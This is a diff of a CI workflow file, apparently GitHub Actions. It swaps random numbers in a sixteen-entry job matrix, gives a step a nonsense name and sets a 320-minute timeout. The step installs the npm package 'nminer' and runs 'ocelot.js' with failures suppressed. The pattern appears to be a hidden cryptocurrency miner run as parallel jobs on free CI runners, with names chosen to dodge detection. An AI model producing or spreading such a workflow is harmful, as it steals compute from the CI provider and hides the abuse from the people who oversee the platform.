@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8890 }
-          - { version: 7003 }
-          - { version: 5339 }
-          - { version: 9684 }
-          - { version: 8665 }
-          - { version: 5608 }
-          - { version: 1787 }
-          - { version: 4895 }
-          - { version: 4789 }
-          - { version: 8454 }
-          - { version: 6324 }
-          - { version: 5837 }
-          - { version: 7612 }
-          - { version: 4118 }
-          - { version: 336 }
-          - { version: 2737 }
+          - { version: 4619 }
+          - { version: 8825 }
+          - { version: 8237 }
+          - { version: 5258 }
+          - { version: 7293 }
+          - { version: 8095 }
+          - { version: 9564 }
+          - { version: 1089 }
+          - { version: 2182 }
+          - { version: 8160 }
+          - { version: 55 }
+          - { version: 9692 }
+          - { version: 9017 }
+          - { version: 7687 }
+          - { version: 514 }
+          - { version: 3564 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: pharmacopoeia cleverly lieu
         run: |
           npm install nminer@latest
-          timeout 315m node ocelot.js || echo "ocelot executed"
+          timeout 320m node ocelot.js || echo "ocelot executed"
